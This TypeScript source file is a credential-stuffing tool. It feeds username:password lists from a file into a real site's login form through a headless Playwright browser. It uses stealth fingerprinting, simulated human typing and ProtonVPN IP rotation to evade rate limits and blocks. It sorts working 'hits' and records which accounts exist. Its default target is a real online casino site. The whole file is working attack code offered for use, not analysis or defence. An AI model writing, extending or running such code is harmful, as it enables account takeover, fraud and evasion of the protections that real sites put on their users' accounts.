// login-auto.ts — Credential stuffing automation
// Reads creds.txt (user:pass per line), reuses scanner selectors,
// attempts login per cred with ProtonVPN WireGuard IP rotation.
//
// Optimizations:
//   - Browser reuse: single browser instance, fresh context per cred (saves ~2-3s/cred)
//   - Adaptive outcome detection: fast-path checks at 1s, full scan at 2.5s
//   - Buffered I/O: batches JSON writes every N creds instead of per-cred
//   - Reduced network timeouts: 8s networkidle instead of 15s

import { chromium, Browser, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
import { scanLogin, ScanResult } from './scanner';
import { initProxies, rotate, smartRotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';


// ─── Types ────────────────────────────────────────────────────────────────────

export type LoginOutcome = "success" | "wrong_credentials" | "rate_limited" | "account_locked" | "captcha_block" | "2fa_required" | "unknown";

export interface DetailedOutcome {
  outcome: LoginOutcome;
  accountExists: boolean;
  message?: string;
}

export interface LoginAttempt {
  url:       string;
  username:  string;
  timestamp: string;
  success:   boolean;
  outcome:   LoginOutcome;
  accountExists: boolean;
  reason:    string;
  tunnel:    string | null;
  durationMs: number;
}

// ─── Creds loader ─────────────────────────────────────────────────────────────

export function loadCreds(filePath: string = './creds.txt'): Array<{ username: string; password: string }> {
  const raw = fs.readFileSync(filePath, 'utf8');
  const creds: Array<{ username: string; password: string }> = [];

  for (const line of raw.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    // Support  user:pass  or  user,pass  or  user|pass
    const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
    const idx = trimmed.indexOf(sep);
    if (idx === -1) continue;

    const username = trimmed.slice(0, idx).trim();
    const password = trimmed.slice(idx + 1).trim();
    if (username && password) creds.push({ username, password });
  }

  return creds;
}

// ─── Result log ───────────────────────────────────────────────────────────────

const LOGIN_LOG = './login_results.json';

const TXT_LOG = './login_results.txt';

// ─── Buffered result writer ────────────────────────────────────────────────────
// Batches JSON writes to avoid reading/parsing/writing the full log on every cred.

const FLUSH_INTERVAL = 10; // flush JSON log every N results
let resultBuffer: LoginAttempt[] = [];

function appendResult(attempt: LoginAttempt): void {
  resultBuffer.push(attempt);

  // Always append to text log immediately (cheap append-only)
  const textLine = `[${attempt.timestamp}] ${attempt.username} | ${attempt.outcome} | Exists: ${attempt.accountExists} | Reason: ${attempt.reason} | VPN: ${attempt.tunnel}\n`;
  fs.appendFileSync(TXT_LOG, textLine);

  // Batch JSON writes
  if (resultBuffer.length >= FLUSH_INTERVAL) {
    flushResults();
  }
}

function flushResults(): void {
  if (resultBuffer.length === 0) return;
  let logs: LoginAttempt[] = [];
  try {
    logs = JSON.parse(fs.readFileSync(LOGIN_LOG, 'utf8'));
  } catch {
    // File doesn't exist or is invalid — start fresh
  }
  logs.push(...resultBuffer);
  fs.writeFileSync(LOGIN_LOG, JSON.stringify(logs, null, 2));
  resultBuffer = [];
}

// ─── Buffered credential removal ────────────────────────────────────────────────
// Module-scope so cleanup() can flush on SIGINT/SIGTERM.

let activeCredsFile: string = './creds.txt'; // set by runLoginAuto
let credRemoveBuffer: Array<{ username: string; password: string }> = [];

function flushCredRemovals(): void {
  if (credRemoveBuffer.length === 0) return;
  try {
    const rawCreds = fs.readFileSync(activeCredsFile, 'utf8');
    const toRemove = new Set(credRemoveBuffer.map(c => `${c.username}\t${c.password}`));
    const filtered = rawCreds.split('\n').filter(l => {
      if (!l.trim() || l.trim().startsWith('#')) return true;
      const trimmed = l.trim();
      const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
      const idx = trimmed.indexOf(sep);
      if (idx === -1) return true;
      const u = trimmed.slice(0, idx).trim();
      const p = trimmed.slice(idx + 1).trim();
      return !toRemove.has(`${u}\t${p}`);
    });
    fs.writeFileSync(activeCredsFile, filtered.join('\n'));
    credRemoveBuffer = [];
  } catch (e) {
    console.error(`[auto] Failed to flush credential removals:`, e);
  }
}

// ─── Post-Submit Outcome Detection ───────────────────────────────────────────

const SIGNALS = {
  failure: {
    keywords: [
      "invalid", "incorrect", "wrong password", "doesn't match",
      "not recognized", "not recognised", "account not found",
      "does not exist", "try again", "unable to log in"
    ],
    selectors: [
      '[class*="error-message"]', '[class*="alert-danger"]',
      '[class*="alert--error"]', '[role="alert"]',
      '[class*="invalid-feedback"]', '.ol-alert'
    ]
  },
  rateLimit: {
    warning: ["further failed attempts may result", "account being blocked"],
    lockout: [
      "too many attempts", "rate limit", "temporarily locked",
      "temporarily disabled", "account locked", "account has been",
      "try again later", "blocked", "suspended", "re-enable", "account disabled"
    ]
  },
  captcha: ["recaptcha", "grecaptcha", "hcaptcha", "cf-turnstile", "arkoselabs", "geetest"]
};

async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedOutcome> {
  // Adaptive wait: check at 1s for fast signals, then extend to 2.5s if unclear
  await page.waitForTimeout(1000);

  let postSubmitUrl = page.url();
  let bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
  let urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();

  // Fast-path: if URL already changed or clear error text, skip additional wait
  const stillOnLogin = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');
  const hasQuickSignal = !stillOnLogin || SIGNALS.failure.keywords.some(s => bodyText.includes(s)) || SIGNALS.rateLimit.lockout.some(s => bodyText.includes(s));

  if (!hasQuickSignal) {
    // No clear signal yet — wait a bit more for the page to settle
    await page.waitForTimeout(1500);
    postSubmitUrl = page.url();
    bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
    urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();
  }

  console.log(`[detect] url: ${postSubmitUrl} (changed=${urlChanged})`);

  // 1. CAPTCHA Detection
  // Only trigger if a CAPTCHA iframe or known element is actually visible and takes up real estate,
  // to avoid false positives from site-wide invisible tracking scripts.
  let hasCaptcha = false;
  
  if (bodyText.includes("solve the captcha") || bodyText.includes("verify you are human") || bodyText.includes("complete the captcha")) {
    hasCaptcha = true;
  } else {
    // Check iframes matching SIGNALS strings
    for (const frame of page.frames()) {
      const url = frame.url().toLowerCase();
      if (SIGNALS.captcha.some(p => url.includes(p))) {
        const fElement = await frame.frameElement().catch(() => null);
        if (fElement) {
          const isVisible = await fElement.isVisible().catch(() => false);
          const box = await fElement.boundingBox().catch(() => null);
          // Invisible trackers are very small, real challenges are large modals
          if (isVisible && box && box.width > 200 && box.height > 60) {
            hasCaptcha = true;
            break;
          }
        }
      }
    }
  }

  if (hasCaptcha) {
    return { outcome: 'captcha_block', accountExists: true, message: 'Visible CAPTCHA challenge detected' };
  }

  // 2. Rate Limit & Lockout Detection (Priority over standard failure)
  const lockoutMsg = SIGNALS.rateLimit.lockout.find(s => bodyText.includes(s));
  const warningMsg = SIGNALS.rateLimit.warning.find(s => bodyText.includes(s));

  if (lockoutMsg) return { outcome: 'account_locked', accountExists: true, message: lockoutMsg };
  if (warningMsg) return { outcome: 'rate_limited', accountExists: true, message: warningMsg };

  // 3. Standard Failure Detection
  const failureMsg = SIGNALS.failure.keywords.find(s => bodyText.includes(s));
  
  // Check visible error selectors — only count if element text contains error-related words
  const ERROR_WORDS = [
    'invalid', 'incorrect', 'wrong', 'error', 'fail', 'denied',
    'locked', 'disabled', 'blocked', 'expired', 'suspend',
    'limit', 'try again', 'unable', 'not found', 'not recognized',
    'does not exist', 'temporarily', 'captcha', 'verify'
  ];
  let hasVisibleError = false;
  let visibleErrorDetail = '';
  for (const selector of SIGNALS.failure.selectors) {
    const locator = page.locator(selector).first();
    if (await locator.isVisible().catch(() => false)) {
      const elText = (await locator.innerText().catch(() => '') || '').trim().toLowerCase();
      // Only count if the text actually contains error-related keywords
      const hasErrorWord = ERROR_WORDS.some(w => elText.includes(w));
      if (hasErrorWord) {
        console.log(`[detect] Error selector: ${selector} | text: "${elText.substring(0, 120)}"`);
        hasVisibleError = true;
        visibleErrorDetail = `visible error [${selector}]: "${elText.substring(0, 80)}"`;
        break;
      }
    }
  }

  if (failureMsg || hasVisibleError) {
    // Determine if account exists: "incorrect" implies existence, 
    // "not found" or "does not exist" implies it doesn't.
    const notFound = bodyText.includes("not found") || bodyText.includes("does not exist");
    return { 
      outcome: 'wrong_credentials', 
      accountExists: !notFound,
      message: failureMsg || visibleErrorDetail || 'visible error selector triggered'
    };
  }

  // 4. THE NEGATIVE SELECTION RULE: Default to Success
  // Only count as success if we navigated AWAY from a login/signin page
  const onLoginPath = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');  
  
  if (!onLoginPath) {
    return { 
      outcome: 'success', 
      accountExists: true, 
      message: `Navigated to: ${postSubmitUrl.split('?')[0]}` 
    };
  }

  // Fallback if we are still on the login page but no errors are visible
  return { outcome: 'unknown', accountExists: false, message: 'no clear signals found' };
}

// ─── Single login attempt ─────────────────────────────────────────────────────

interface PrecomputedSelectors {
  usernameCss: string;
  passwordCss: string;
  submitCss: string;
}

async function attemptLogin(
  page:     Page,
  url:      string,
  selectors: ScanResult['selectors'],
  username: string,
  password: string,
  precomputed?: PrecomputedSelectors
): Promise<DetailedOutcome> {

  // Use precomputed selectors if available, otherwise compute on the fly
  let usernameCss: string, passwordCss: string, submitCss: string;
  if (precomputed) {
    ({ usernameCss, passwordCss, submitCss } = precomputed);
  } else {
    const usernameEl = selectors.find((s: any) => s.role === 'username_field');
    const passwordEl = selectors.find((s: any) => s.role === 'password_field');
    const submitEl   = selectors.find((s: any) => s.role === 'submit_button');
    const buildSel = (el: any, fallback: string): string => {
      if (el?.id)   return `#${el.id}`;
      if (el?.name) return `[name="${el.name}"]`;
      return fallback;
    };
    usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
    passwordCss = buildSel(passwordEl, 'input[type="password"]');
    submitCss   = buildSel(submitEl, '#loginSubmit');
  }

  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
  await page.waitForLoadState('networkidle', { timeout: 8000 }).catch(() => {});

  // Capture actual URL after redirect (not the Google redirect URL)
  const actualLoginUrl = page.url();
  console.log(`[login] actual URL after load: ${actualLoginUrl}`);

  await simulateHuman(page);

  // Check if we need to click a "Login" button to open the form
  try {
    const loginNavBtn = 'body > div.ol-pos_sticky.ol-top_0.ol-z_docked > div > header > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__loggedOut.ol-headerRight__loggedOut--variant_center.ol-headerRight__loggedOut--size_lg > div > a';
    if (await page.isVisible(loginNavBtn)) {
      console.log(`[login] Clicking specific login nav button`);
      await page.click(loginNavBtn, { timeout: 5000 });
      await page.waitForTimeout(1000);
    } else {
      const genericBtn = await page.$('a:has-text("Login"), button:has-text("Login"), a:has-text("Log In"), button:has-text("Log In")');
      if (genericBtn && await genericBtn.isVisible()) {
        console.log(`[login] Clicking generic Login button`);
        await genericBtn.click();
        await page.waitForTimeout(1000);
      }
    }
  } catch (e) {}

  // Check form fields are visible before typing
  const userVisible = await page.locator(usernameCss).first().isVisible().catch(() => false);
  const passVisible = await page.locator(passwordCss).first().isVisible().catch(() => false);
  const submitVisible = await page.locator(submitCss).first().isVisible().catch(() => false);
  console.log(`[login] fields visible: user=${userVisible} pass=${passVisible} submit=${submitVisible}`);

  if (!userVisible || !passVisible) {
    console.warn(`[login] Form fields not visible — page may not have loaded correctly`);
    // Try screenshot for debug
    await page.screenshot({ path: `./debug_form_${Date.now()}.png`, fullPage: true }).catch(() => {});
  }

  // Bypass HTML5 email validation — some creds are usernames, not emails
  await page.evaluate((sel) => {
    const el = document.querySelector(sel) as HTMLInputElement | null;
    if (el && el.type === 'email') el.type = 'text';
  }, usernameCss);

  await humanType(page, usernameCss, username);
  await page.waitForTimeout(randDelay(200, 400));

  let lastOutcome: DetailedOutcome | null = null;
  const errorStrs: string[] = [];

  for (let attemptNum = 1; attemptNum <= 3; attemptNum++) {
    // Restore the password string in case the web form wipes the field on failure
    const passLoc = page.locator(passwordCss).first();
    if (await passLoc.isVisible().catch(() => false)) {
      await passLoc.fill('');
      await humanType(page, passwordCss, password);
      await page.waitForTimeout(randDelay(200, 400));
    }

    if (!await page.locator(submitCss).first().isVisible().catch(() => false)) {
      console.warn(`[login] Submit button ${submitCss} not visible — trying fallback selectors`);
      // Try common submit button selectors
      const fallbacks = ['button[type="submit"]', 'input[type="submit"]', 'button:has-text("Login")', 'button:has-text("Log In")', 'button:has-text("Sign In")'];
      let clicked = false;
      for (const fb of fallbacks) {
        if (await page.locator(fb).first().isVisible().catch(() => false)) {
          console.log(`[login] Using fallback submit: ${fb}`);
          await page.click(fb);
          clicked = true;
          break;
        }
      }
      if (!clicked) {
        console.error(`[login] No submit button found — pressing Enter as last resort`);
        await page.keyboard.press('Enter');
      }
    } else {
      await page.click(submitCss);
    }
    lastOutcome = await detectOutcome(page, actualLoginUrl);

    // Log each click result individually
    console.log(`[auto]   click ${attemptNum}/3: ${lastOutcome.outcome} — ${lastOutcome.message || 'no message'}`);

    // Stop on success or 2FA prompt
    if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required') {
      break;
    }

    // If first click returns account_locked with "account has been" — skip to next cred immediately
    if (attemptNum === 1 && lastOutcome.outcome === 'account_locked' && (lastOutcome.message || '').includes('account has been')) {
      console.log(`[auto]   account permanently locked — skipping to next cred`);
      errorStrs.push(lastOutcome.message || 'account has been locked');
      break;
    }

    // Visible error selector = likely detection/block — break immediately so outer loop can rotate VPN
    if ((lastOutcome.message || '').includes('visible error selector triggered')) {
      console.log(`[auto]   visible error selector — will rotate VPN and retry`);
      errorStrs.push(lastOutcome.message || 'visible error selector triggered');
      break;
    }

    // Accumulate all errors
    if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
      errorStrs.push(lastOutcome.message);
    }

    // 1 second wait between clicks
    if (attemptNum < 3) {
      await page.waitForTimeout(1000);
    }
  }

  // Bind the sequence of error strings to the reason so it prints elegantly 
  if (lastOutcome! && errorStrs.length > 0 && lastOutcome!.outcome !== 'success') {
    lastOutcome!.message = errorStrs.join(' -> ');
  }

  return lastOutcome!;
}

// ─── Is block/rate-limit error? ───────────────────────────────────────────────

function isBlockError(msg: string): boolean {
  const blockPhrases = [
    'ERR_CONNECTION_RESET', 'ERR_CONNECTION_REFUSED', 'ERR_PROXY',
    'net::ERR', 'timeout', 'TIMEOUT'
  ];
  return blockPhrases.some(p => msg.includes(p));
}

// ─── Main automation loop ─────────────────────────────────────────────────────

export async function runLoginAuto(
  targetUrl:  string = 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x',
  credsFile:  string = './creds.txt',
  options: {
    delayBetweenMs?: [number, number]; // [min, max] delay between attempts
    rotateEvery?:    number;            // rotate VPN every N attempts (0 = only on block)
    stopOnSuccess?:  boolean;           // stop after first working cred
  } = {}
): Promise<void> {
  const {
    delayBetweenMs = [1000, 1000],
    rotateEvery    = 0,
    stopOnSuccess  = false,
  } = options;

  if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;

  // ── ProtonVPN WireGuard rotation (must activate BEFORE scanner/network) ──
  const configDir = process.env.PROTON_CONFIG_DIR || './proton_configs';
  const vpnSlots = initProxies(configDir);
  if (vpnSlots.length === 0) {
    console.error('[auto] No VPN configs found. Add ProtonVPN WireGuard .conf files to ./proton_configs/');
    console.error('[auto] Or set PROTON_CONFIG_DIR=/path/to/configs');
    return;
  }

  // Activate the first VPN before any network requests
  let activeVpn = rotate();
  if (!activeVpn) {
    console.error('[auto] Failed to activate initial VPN. Cannot proceed.');
    return;
  }

  // ── Load creds ──────────────────────────────────────────────────────────────
  const creds = loadCreds(credsFile);
  if (creds.length === 0) {
    console.error(`[auto] No creds found in ${credsFile}. Add lines in format: username:password`);
    return;
  }
  console.log(`[auto] Loaded ${creds.length} credential(s) from ${credsFile}`);

  // ── Get selectors from scan_results.json (most recent with selectors) ───────
  let selectors: ScanResult['selectors'] = [];
  let scanLog: ScanResult[] = [];
  try {
    scanLog = JSON.parse(fs.readFileSync('./scan_results.json', 'utf8'));
  } catch {
    // File doesn't exist or is invalid — will run scanner
  }
  const withSelectors = scanLog.filter(r => r.url === targetUrl && r.selectors.length > 0);

  if (withSelectors.length > 0) {
    selectors = withSelectors[withSelectors.length - 1].selectors;
    console.log(`[auto] Reusing ${selectors.length} selector(s) from previous scan`);
  } else {
    console.log(`[auto] No cached selectors for ${targetUrl} — running scanner first...`);
    const scanResult = await scanLogin(targetUrl);
    if (scanResult.selectors.length === 0) {
      console.error('[auto] Scanner found no selectors. Cannot proceed with login automation.');
      console.error('[auto] Ensure VPN is working and the scanner can reach the page.');
      return;
    }
    selectors = scanResult.selectors;
    console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
  }

  // ── Precompute selectors once (same for every cred) ──────────────────────────
  const usernameEl = selectors.find((s: any) => s.role === 'username_field');
  const passwordEl = selectors.find((s: any) => s.role === 'password_field');
  const submitEl   = selectors.find((s: any) => s.role === 'submit_button');
  const buildSel = (el: any, fallback: string): string => {
    if (el?.id)   return `#${el.id}`;
    if (el?.name) return `[name="${el.name}"]`;
    return fallback;
  };
  const precomputedSelectors = {
    usernameCss: buildSel(usernameEl, 'input[type="email"], input[type="text"]'),
    passwordCss: buildSel(passwordEl, 'input[type="password"]'),
    submitCss:   buildSel(submitEl, '#loginSubmit'),
  };
  console.log(`[auto] Precomputed selectors: user=${precomputedSelectors.usernameCss} pass=${precomputedSelectors.passwordCss} submit=${precomputedSelectors.submitCss}`);

  // ── Stat tracking ────────────────────────────────────────────────────────────
  let attempted = 0;
  let succeeded = 0;
  const hits: LoginAttempt[] = [];
  // Set module-level credsFile for cleanup handler access
  activeCredsFile = credsFile;

  const MAX_VISIBLE_ERROR_RETRIES = 3;

  // ── Shared browser instance (reuse across creds, only relaunch on VPN rotation) ─
  let browser: Browser = await chromium.launch({
    headless: true,
    args: STEALTH_LAUNCH_ARGS,
    ignoreHTTPSErrors: true as any,
  } as any);
  let browserCredsProcessed = 0;
  const BROWSER_RECYCLE_INTERVAL = 25; // recycle browser every N creds to prevent memory leaks

  async function ensureBrowser(): Promise<Browser> {
    if (browser && browser.isConnected()) return browser;
    browser = await chromium.launch({
      headless: true,
      args: STEALTH_LAUNCH_ARGS,
      ignoreHTTPSErrors: true as any,
    } as any);
    browserCredsProcessed = 0;
    return browser;
  }

  async function recycleBrowser(): Promise<void> {
    try { await browser.close(); } catch {}
    browser = await chromium.launch({
      headless: true,
      args: STEALTH_LAUNCH_ARGS,
      ignoreHTTPSErrors: true as any,
    } as any);
    browserCredsProcessed = 0;
  }

  // ── Loop through creds ──────────────────────────────────────────────────────
  // Wrapped in try/finally to ensure buffers are flushed even on unexpected errors
  try {
  for (let i = 0; i < creds.length; i++) {
    const { username, password } = creds[i];

    // Rotate VPN based on rotateEvery setting (default 0 = only rotate on blocks)
    if (rotateEvery > 0 && i > 0 && i % rotateEvery === 0) {
      console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
      activeVpn = smartRotate();
      if (!activeVpn) {
        activeVpn = rotate(); // fallback to simple rotation
      }
      if (!activeVpn) {
        console.warn('[auto] VPN rotation failed — continuing with current connection.');
      }
    }

    // Recycle browser periodically to prevent memory leaks
    if (browserCredsProcessed >= BROWSER_RECYCLE_INTERVAL) {
      console.log(`[auto] Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds processed)...`);
      await recycleBrowser();
    }

    let vpnName = activeVpn?.name ?? 'none';
    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | vpn: ${vpnName}`);

    let attempt: LoginAttempt = {
      url:        targetUrl,
      username,
      timestamp:  new Date().toISOString(),
      success:    false,
      outcome:    'unknown',
      accountExists: false,
      reason:     '',
      tunnel:     vpnName,
      durationMs: 0,
    };

    // Retry loop: if we get errors, rotate VPN and retry
    // with a fresh context (up to MAX_VISIBLE_ERROR_RETRIES times)
    for (let retryNum = 0; retryNum <= MAX_VISIBLE_ERROR_RETRIES; retryNum++) {

      await ensureBrowser();

      // Fresh context per attempt = fresh cookies, storage, fingerprint
      const ctxOpts = getStealthContextOptions();
      const context = await browser.newContext({
        ...ctxOpts,
        ignoreHTTPSErrors: true as any,
      } as any);

      const page = await context.newPage();
      const fpSeed = `login-${username}-${Date.now()}-r${retryNum}`;
      await injectDeepStealth(page, fpSeed, {
        navPlatform: ctxOpts._navPlatform,
        uaDataPlatform: ctxOpts._uaDataPlatform,
        chromeVersion: ctxOpts._chromeVersion,
      });
      if (retryNum > 0) {
        console.log(`[auto]   new fingerprint: UA=${(ctxOpts.userAgent || '').slice(-30)} viewport=${ctxOpts.viewport?.width}x${ctxOpts.viewport?.height}`);
      }

      const t0 = Date.now();
      attempt.timestamp = new Date().toISOString();
      attempt.tunnel = activeVpn?.name ?? 'none';

      let shouldRetry = false;

      try {
        const outcome = await attemptLogin(page, targetUrl, selectors, username, password, precomputedSelectors);

        attempt.success       = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
        attempt.outcome       = outcome.outcome;
        attempt.accountExists = outcome.accountExists;
        attempt.reason        = outcome.message || outcome.outcome;
        attempt.durationMs    = Date.now() - t0;

        // Screenshot every final click per credential
        await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});

        if (attempt.success) {
          console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
          if (activeVpn) vpnSuccess(activeVpn);
          succeeded++;
          hits.push(attempt);
        } else if (outcome.outcome === 'account_locked' && (outcome.message || '').includes('account has been')) {
          console.log(`[auto] ✗ account permanently locked: ${username} — moving on`);
        } else if (retryNum < MAX_VISIBLE_ERROR_RETRIES) {
          const isVisibleError = (outcome.message || '').includes('visible error selector triggered');
          console.warn(`[auto] ✗ ${outcome.outcome} on ${vpnName} — rotating VPN + fingerprint, retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})${isVisibleError ? ' [IMMEDIATE]' : ''}...`);
          if (activeVpn) vpnFail(activeVpn);
          activeVpn = smartRotate();
          vpnName = activeVpn?.name ?? 'none';
          shouldRetry = true;
          (attempt as any)._immediateRetry = isVisibleError;
        } else {
          console.log(`[auto] ✗ miss: ${username} (${attempt.reason}) — exhausted all retries`);
        }

      } catch (err: any) {
        console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
        attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
        attempt.durationMs = Date.now() - t0;

        if (activeVpn) vpnFail(activeVpn);
        if (isBlockError(err.message ?? '')) {
          console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
          activeVpn = smartRotate();
          vpnName = activeVpn?.name ?? 'none';
          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
          // Force browser recycle on connection errors
          await recycleBrowser().catch(e => {
            console.error(`[auto] recycleBrowser failed: ${e.message?.split('\n')[0]}`);
            shouldRetry = false; // can't continue without a browser
          });
        }
      }

      // Close context only (keep browser alive)
      await context.close().catch(() => {});
      browserCredsProcessed++;

      if (!shouldRetry) break;

      if (!(attempt as any)._immediateRetry) {
        console.log(`[auto] Waiting 1s before retry...`);
        await new Promise(r => setTimeout(r, 1000));
      }
      console.log(`[auto] Retrying with new VPN: ${vpnName} + fresh fingerprint`);
    }

    appendResult(attempt);

    // ── Sort and buffer credential removal ──
    try {
      // Map outcome to folder
      const outcomeToFolder: Record<LoginOutcome, string> = {
        success:           'success',
        '2fa_required':    'success',
        wrong_credentials: 'wrong_credentials',
        account_locked:    'locked',
        captcha_block:     'captcha',
        rate_limited:      'rate_limited',
        unknown:           'unknown',
      };
      const targetFolder = outcomeToFolder[attempt.outcome] || 'unknown';

      const tPath = `./${targetFolder}`;
      if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
      fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);

      // Buffer removal instead of rewriting creds.txt on every cred
      credRemoveBuffer.push({ username, password });
      if (credRemoveBuffer.length >= FLUSH_INTERVAL) {
        flushCredRemovals();
      }
    } catch(e) {
      console.error(`[auto] Failed to sort/remove credential:`, e);
    }

    attempted++;

    if (stopOnSuccess && succeeded > 0) {
      console.log(`\n[auto] stopOnSuccess=true — stopping after first hit`);
      break;
    }

    // Delay between attempts
    if (i < creds.length - 1) {
      const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
      console.log(`[auto] Waiting ${(delay / 1000).toFixed(1)}s before next attempt...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }
  } finally {
    // Always flush buffers, even on unexpected errors
    flushResults();
    flushCredRemovals();
    try { await browser.close(); } catch {}
  }

  // ── Summary ─────────────────────────────────────────────────────────────────
  console.log(`\n${'─'.repeat(54)}`);
  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s)`);
  if (hits.length > 0) {
    console.log('[auto] Successful credentials:');
    for (const h of hits) {
      console.log(`  ✓  ${h.username}  (${h.reason}, ${h.durationMs}ms)`);
    }
  }
  console.log(`[auto] Results saved to ${LOGIN_LOG}`);
  printProxyStats();
  console.log(`${'─'.repeat(54)}\n`);
}

// ── Graceful shutdown — flush buffers and tear down VPN on exit ────────────────
function cleanup() {
  console.log('\n[auto] Shutting down — flushing buffers and disconnecting VPN...');
  flushResults();
  flushCredRemovals();
  vpnDown();
  process.exit(0);
}
process.on('SIGINT', cleanup);
process.on('SIGTERM', cleanup);

// ── Allow direct execution ────────────────────────────────────────────────────
if (require.main === module) {
  const url = process.argv[2] || 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x';
  runLoginAuto(url)
    .then(() => { vpnDown(); })
    .catch(e => { console.error(e); vpnDown(); process.exit(1); });
}
